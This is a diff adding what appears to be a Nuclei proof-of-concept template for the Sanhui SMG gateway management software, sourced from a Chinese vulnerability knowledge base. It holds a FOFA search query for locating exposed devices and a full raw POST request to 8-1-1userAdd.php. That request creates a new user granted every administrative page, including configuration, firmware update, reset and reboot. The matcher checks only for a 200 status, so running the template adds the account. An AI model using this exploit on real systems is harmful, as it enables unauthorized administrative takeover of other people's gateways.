@@ -1,0 +1,37 @@
+id: poc-zak58bv6d9iwggd0
+info:
+  name: 三汇SMG 网关管理软件 8-1-1userAdd.php 存在文件任意用户添加
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zak58bv6d9iwggd0'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zak58bv6d9iwggd0
+    fofa: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
+http:
+- raw:
+  - 'user_name=md5("{{name}}")
+
+    user_password=md5("1{{pass}}")
+
+    例如：随机生成name=abcde（MD5=ab56b4d92b40713acc5af89985d4b786）、pass=12345（拼接 1 后 = 112345，MD5=96e79218965eb72c92a549dd5a330112）
+
+
+    POST /en/8-1-1userAdd.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 1419
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+
+    user_name=ab56b4d92b40713acc5af89985d4b786&user_token=&user_password=96e79218965eb72c92a549dd5a330112&user_authorization=1&page%5B%5D=1-1sysinfo&page%5B%5D=1-4chstatus&page%5B%5D=1-3callcount&page%5B%5D=1-6sipmsgcount&page%5B%5D=1-5guideset&page%5B%5D=2-1sipset&page%5B%5D=2-3sipcompatibility&page%5B%5D=2-4natset&page%5B%5D=2-2mediaset&page%5B%5D=3-1-1FXSset&page%5B%5D=3-8tone&page%5B%5D=3-12callsound&page%5B%5D=3-10dtmf&page%5B%5D=3-9ringnum&page%5B%5D=3-2faxpara&page%5B%5D=3-3funkey&page%5B%5D=3-4dialrules&page%5B%5D=3-5dialtimeout&page%5B%5D=3-7tip&page%5B%5D=3-11ringback&page%5B%5D=3-8qos&page%5B%5D=3-14actionurl&page%5B%5D=3-17ModuleArea&page%5B%5D=3-16vpnset&page%5B%5D=8-1user&page%5B%5D=4-1fxsset&page%5B%5D=4-1fxsadvance&page%5B%5D=4-2groupportset&page%5B%5D=5-4RouteParameter&page%5B%5D=5-1routerulesIP2Tel&page%5B%5D=5-2routerulesTel2IP&page%5B%5D=7-1manipulateSrcIP2Tel&page%5B%5D=7-2manipulateDstIP2Tel&page%5B%5D=7-3manipulateSrcTel2IP&page%5B%5D=7-4manipulateDstTel2IP&page%5B%5D=6-16manageconfig&page%5B%5D=6-21configfile&page%5B%5D=6-1netset&page%5B%5D=6-3softupdate&page%5B%5D=6-15pcap&page%5B%5D=6-17calllog&page%5B%5D=6-19operatelog&page%5B%5D=6-6backup&page%5B%5D=6-7reset&page%5B%5D=6-13systemmonitor&page%5B%5D=6-22certificates&page%5B%5D=6-23configoptimize&page%5B%5D=6-10snmp&page%5B%5D=6-10tr069&page%5B%5D=6-20iptables&page%5B%5D=6-11ping&page%5B%5D=6-22DNSTest&page%5B%5D=6-12trace&page%5B%5D=6-5modifypwd&page%5B%5D=6-8reboot&save=Save'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
